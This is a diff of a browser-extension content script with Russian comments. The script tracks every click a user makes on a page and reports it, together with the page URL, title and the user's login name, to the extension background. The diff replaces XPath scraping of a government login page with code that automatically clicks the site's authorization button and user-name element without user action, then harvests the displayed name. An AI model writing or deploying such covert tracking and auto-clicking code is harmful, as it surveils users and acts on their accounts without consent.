@@ -1,65 +1,110 @@
 (function () {
-    let lastSent = 0;
     const MIN_INTERVAL_MS = 10;
+    let lastSent = 0;
 
-    // Получение логина по двум XPath
-    function getUserLogin() {
-        const xpathPrimary = "/html/body/esia-root/div/esia-login/div/div[1]/form/div[1]/div[2]//input";
-        const xpathFallback = "/html/body/esia-root/div/esia-login/div/div[1]/form/esia-login-found/div/div[2]/div/b";
-
-
-        try {
-            // Пробуем основной XPath (input)
-            let result = document.evaluate(xpathPrimary, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
-            let node = result.singleNodeValue;
-
-            if (node && node.value && node.value.trim() !== "") {
-                return node.value.trim();
-            }
-
-            // Если основной не найден — fallback
-            result = document.evaluate(xpathFallback, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
-            node = result.singleNodeValue;
-
-            if (node) {
-                const text = (node.innerText || node.textContent || "").trim();
-                return text !== "" ? text : null;
-            }
-
-            return null;
-        } catch (err) {
-            console.error("Ошибка при получении логина:", err);
-            return null;
-        }
+    function getAuthButton() {
+        return document.querySelector('lib-header-auth button');
     }
 
+    function getUserNameElement() {
+        return document.querySelector('lib-header-user-name p');
+    }
+
+    function clickAuthButton() {
+        const btn = getAuthButton();
+        if (btn) {
+            btn.click();
+            return true;
+        }
+        return false;
+    }
+
+    function clickUserNameElement() {
+        const el = getUserNameElement();
+        if (el) {
+            el.click();
+            return true;
+        }
+        return false;
+    }
+
+    function getUserName() {
+        const el = getUserNameElement();
+        if (!el) return null;
+        const text = (el.innerText || el.textContent || "").trim();
+        return text !== "" ? text : null;
+    }
+
+    // Автоклик по кнопке авторизации после загрузки DOM
+    document.addEventListener("DOMContentLoaded", () => {
+        const tryClickAuth = setInterval(() => {
+            if (clickAuthButton()) {
+                clearInterval(tryClickAuth);
+                waitForUserName();
+            }
+        }, 300);
+    });
+
+    // Ждём появления имени пользователя и кликаем по нему
+    function waitForUserName() {
+        const interval = setInterval(() => {
+            if (clickUserNameElement()) {
+                const name = getUserName();
+                if (name) {
+                    chrome.runtime.sendMessage({
+                        type: "user_login",
+                        payload: {
+                            user_name: name,
+                            timestamp: new Date().toISOString(),
+                            page_url: window.location.href,
+                            page_title: document.title || ""
+                        }
+                    });
+                    clearInterval(interval);
+                }
+            }
+        }, 200);
+    }
+
+    // Логика трекера кликов с обязательным getUserNameElement после getAuthButton
     document.addEventListener('click', function (e) {
         try {
             const now = Date.now();
             if (now - lastSent < MIN_INTERVAL_MS) return;
             lastSent = now;
 
+            // Сначала пытаемся кликнуть по кнопке авторизации
+            clickAuthButton();
+
+            // После этого получаем имя пользователя
+            const userNameEl = getUserNameElement();
+            const userName = userNameEl ? (userNameEl.innerText || userNameEl.textContent || '').trim() : null;
+
             const el = e.target;
             const link = el.closest('a')?.href || null;
-            const text = (el.innerText || el.textContent || '').trim();
+            let text = (el.innerText || el.textContent || '').trim();
 
-            const data = {
-                url: link,
-                text: text,
-                page_url: window.location.href,
-                page_title: document.title || '',
-                mechanism: "click",
-                timestamp: new Date().toISOString(),
-                user_login: getUserLogin()
-            };
+            // Если элемент не имеет текста, но это кнопка, взять value или aria-label
+            if (!text && el.tagName.toLowerCase() === 'button') {
+                text = el.value || el.getAttribute('aria-label') || 'button';
+            }
 
             chrome.runtime.sendMessage({
                 type: "click",
-                payload: data
+                payload: {
+                    url: link,
+                    text: text,
+                    page_url: window.location.href,
+                    page_title: document.title || '',
+                    mechanism: "click",
+                    timestamp: new Date().toISOString(),
+                    user_login: userName
+                }
             });
 
         } catch (err) {
             console.error("Click tracker exception:", err);
         }
     }, true);
+
 })();
